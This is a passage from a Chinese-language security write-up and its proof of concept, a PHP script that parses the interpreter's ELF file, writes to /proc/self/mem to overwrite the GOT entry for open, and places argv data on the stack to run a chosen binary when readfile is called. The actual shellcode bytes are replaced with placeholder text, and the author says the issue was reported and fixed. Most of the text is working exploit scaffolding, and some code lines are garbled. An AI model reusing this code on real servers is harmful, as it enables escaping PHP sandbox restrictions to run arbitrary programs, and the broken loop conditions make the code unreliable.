    foreach(explode(' ', $args) as $arg) {
        fseek($mem, $arg_ptr);
        fwrite($mem, $test->packlli($str_ptr));
        $arg_ptr += 8;
        $str_ptr += strlen($arg) + 1;
    }
    fseek($mem, $arg_ptr);
    fwrite($mem, $test->packlli(0x00));
    echo "Argv: " . $args . "\n";
    echo "ELF PATH $path\n";
到这，我们已经准备好所有的东西了，接下来在GOT表里open函数指向的地址，也就是我们一开始找到的一个可写可执行的地址`$shellcode_loc =
$pie_base + 0x2333;`写入我们的shellcode:
    $shellcode = "shellcode打马赛克".
        $test->packlli($filename_ptr)
        ."shellcode打马赛克"
        .$test->packlli($argv_ptr)
        ."shellcode打马赛克";
    fseek($mem, $shellcode_loc);
    fwrite($mem, $shellcode);
完成整个利用。
流程为：
  1. 解析php文件获得plt里面open指向plt表的地址
  2. 通过获取到的plt表的地址，等待程序运行填充00后将这个地址修改为我们准备放shellcode的风水宝地。
  3. 丢入shellcode，完成劫持GOT表。
接下来我们随便执行一个有文件操作，也就是会调用libc里面的open函数的php函数，即可触发：
    readfile('email->PI:EMAIL', 'r');
    echo "DONE\n";
    exit();
完整的利用就出来了:
#### 调试
我调试的源码为PHP7.1.10，在最后的触发shellcode的readfile函数处下的断点。然后用GDB给GOT表里面我们修改的那个shellcode的起始地址下一个断点，执行：
就成功断在我们shellcode的入口了，在这我们就看到我们之前编写的shellcode，之后就可以慢慢调试你的shellcode了。
#### 其他
  * 只作为思路分享，exp不公开，已提交官方并修复了此问题。
  * 错误的地方请通过邮箱 PI:EMAIL 和我取得联系并帮助我修正。
  * 完整POC（去掉了shellcode部分）：
    elf_bin;
        }
        public function setElfBin($elf_bin)
        {
            $this->elf_bin = fopen($elf_bin,"rb");
        }
        public function unp($value)
        {
            return hexdec(bin2hex(strrev($value)));
        }
        public function get($start,$len){
            fseek($this->elf_bin,$start);
            $data=fread ($this->elf_bin,$len);
            rewind($this->elf_bin);
            return $this->unp($data);
        }
        public function get_section($elf_bin=""){
            if ($elf_bin){
                $this->setElfBin($elf_bin);
            }
            $this->elf_shoff=$this->get(0x28,8);
            $this->elf_shentsize=$this->get(0x3a,2);
            $this->elf_shnum=$this->get(0x3c,2);
            $this->elf_shstrndx=$this->get(0x3e,2);
            for ($i=0;$ielf_shnum;$i+=1){
                $sh_type=$this->get($this->elf_shoff+$i*$this->elf_shentsize+4,4);
                switch ($sh_type){
                    case SHT_STRTAB:
                        $this->strtab_section[$i]=
                            array(
                                'strtab_offset'=>$this->get($this->elf_shoff+$i*$this->elf_shentsize+24,8),
                                'strtab_size'=>$this->strtab_size=$this->get($this->elf_shoff+$i*$this->elf_shentsize+32,8)
                            );
                        break;
                    case SHT_RELA:
                        $this->rel_plt_section[$i]=
                            array(
                                'rel_plt_offset'=>$this->get($this->elf_shoff+$i*$this->elf_shentsize+24,8),
                                'rel_plt_size'=>$this->strtab_size=$this->get($this->elf_shoff+$i*$this->elf_shentsize+32,8),
                                'rel_plt_entsize'=>$this->get($this->elf_shoff+$i*$this->elf_shentsize+56,8)
                            );
                        break;
                    case SHT_DNYSYM:
                        $this->dynsym_section[$i]=
                            array(
                                'dynsym_offset'=>$this->get($this->elf_shoff+$i*$this->elf_shentsize+24,8),
                                'dynsym_size'=>$this->strtab_size=$this->get($this->elf_shoff+$i*$this->elf_shentsize+32,8),
                                'dynsym_entsize'=>$this->get($this->elf_shoff+$i*$this->elf_shentsize+56,8)
                            );
                        break;
                    case SHT_NULL:
                    case SHT_PROGBITS:
                    case SHT_DYNAMIC:
                    case SHT_SYMTAB:
                    case SHT_NOBITS:
                    case SHT_NOTE:
                    case SHT_FINI_ARRAY:
                    case SHT_INIT_ARRAY:
                    case SHT_GNU_versym:
                    case SHT_GNU_HASH:
                        break;
                    default:
    //                    echo "who knows what $sh_type this is? ";
                }
            }
        }
        public function get_reloc(){
            $rel_plts=array();
            $dynsym_section= reset($this->dynsym_section);
            $strtab_section=reset($this->strtab_section);
            foreach ($this->rel_plt_section as $rel_plt ){
                for ($i=$rel_plt['rel_plt_offset'];
                     $iget($i,8);
                    $rel_info=$this->get($i+8,8)>>32;
                    $fun_name_offset=$this->get($dynsym_section['dynsym_offset']+$rel_info*$dynsym_section['dynsym_entsize'],4);
                    $fun_name_offset=$strtab_section['strtab_offset']+$fun_name_offset-1;
                    $fun_name='';
                    while ($this->get(++$fun_name_offset,1)!=""){
                        $fun_name.=chr($this->get($fun_name_offset,1));
                    }
                    $rel_plts[$fun_name]=$rel_offset;
                }
            }
            $this->rel_plts=$rel_plts;
        }
        public function get_shared_library($elf_bin=""){
            if ($elf_bin){
                $this->setElfBin($elf_bin);
            }
            $shared_librarys=array();
            $dynsym_section=reset($this->dynsym_section);
            $strtab_section=reset($this->strtab_section);
            for ($i=$dynsym_section['dynsym_offset']+$dynsym_section['dynsym_entsize'];
                 $iget($i+8,8);
                $fun_name_offset=$this->get($i,4);
                $fun_name_offset=$fun_name_offset+$strtab_section['strtab_offset']-1;
                $fun_name='';
                while ($this->get(++$fun_name_offset,1)!=""){
                    $fun_name.=chr($this->get($fun_name_offset,1));
                }
                $shared_librarys[$fun_name]=$shared_library_offset;
            }
            $this->shared_librarys=$shared_librarys;
        }
        public function close(){
            fclose($this->elf_bin);
        }
        public function __destruct()
        {
            $this->close();
        }
        public function packlli($value) {
            $higher = ($value & 0xffffffff00000000) >> 32;
            $lower = $value & 0x00000000ffffffff;
            return pack('V2', $lower, $higher);
        }
    }
    $test=new elf();
    $test->get_section('/proc/self/exe');
    $test->get_reloc();
    $open_php=$test->rel_plts['open'];
    $maps = file_get_contents('/proc/self/maps');
    preg_match('/(\w+)-(\w+)\s+.+\[stack]/', $maps, $stack);
    echo "Stack location: ".$stack[1]."\n";
    $pie_base = hexdec("0x".(explode('-', $maps)[0]));
    echo "PIE base: ".$pie_base."\n";
    $mem = fopen('/proc/self/mem', 'wb');
    $shellcode_loc = $pie_base + 0x2333;
    fseek($mem, $open_php);
    fwrite($mem, $test->packlli($shellcode_loc));
    $stack=hexdec("0x".$stack[1]);
    fseek($mem, $stack);
    fwrite($mem, "{$path}\x00");
    $filename_ptr = $stack;
    $stack += strlen($path) + 1;
    fseek($mem, $stack);
    fwrite($mem, str_replace(" ", "\x00", $args) . "\x00");
    $str_ptr = $stack;
    $argv_ptr = $arg_ptr = $stack + strlen($args) + 1;
    foreach(explode(' ', $args) as $arg) {
        fseek($mem, $arg_ptr);
        fwrite($mem, $test->packlli($str_ptr));
        $arg_ptr += 8;
        $str_ptr += strlen($arg) + 1;
    }
    fseek($mem, $arg_ptr);
    fwrite($mem, $test->packlli(0x00));
    echo "Argv: " . $args . "\n";
    echo "ELF PATH $path\n";
    $shellcode = "好孩子要自己写shellcode哦".
        $test->packlli($filename_ptr)
        ."\x48\xbe"
        .$test->packlli($argv_ptr)
        ."好孩子要自己写shellcode哦";
    fseek($mem, $shellcode_loc);
    fwrite($mem, $shellcode);
    readfile('email->PI:EMAIL', 'r');
    echo "DONE\n";
    exit();
#### 主要引用与参考
  1. 
  2. blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/
  3. 
  4. 
  5. 
  6. 为了省略篇幅，只列出了主要参考内容。